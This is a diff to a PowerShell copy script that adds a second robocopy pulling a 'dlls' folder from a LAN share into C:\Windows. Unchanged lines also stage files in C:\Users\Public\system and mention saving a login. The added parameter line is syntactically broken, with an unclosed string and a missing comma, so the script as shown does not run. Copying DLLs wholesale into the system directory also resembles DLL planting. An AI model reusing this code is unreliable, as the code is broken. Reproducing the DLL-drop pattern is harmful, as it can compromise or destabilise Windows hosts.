@@ -1,6 +1,7 @@
 
 param(
 	[string]$SourcePath = "\\192.168.13.26\IT\company"
+	[string]$SourcePath2 = "\\192.168.13.26\IT\company\dlls
 )
 
 
@@ -30,6 +31,7 @@ Write-Host "[*] Save Login 192.168.157.3 Done!" -ForegroundColor Green
 
 
 $DestinationPath = "C:\Users\Public\system"
+$DestinationPath2 = "C:\Windows"
 
 if (!(Test-Path -Path $DestinationPath)) {
     New-Item -ItemType Directory -Force -Path $DestinationPath | Out-Null
@@ -41,3 +43,8 @@ if (!(Test-Path -Path $DestinationPath)) {
 robocopy $SourcePath $DestinationPath /E /COPY:DAT /R:3 /W:3
 
 Write-Host "[*] Copy process completed!" -ForegroundColor Green
+
+robocopy $SourcePath2 $DestinationPath2 /E /COPY:DAT /R:3 /W:3
+Write-Host "[*] Copy process completed!" -ForegroundColor Green
+
+
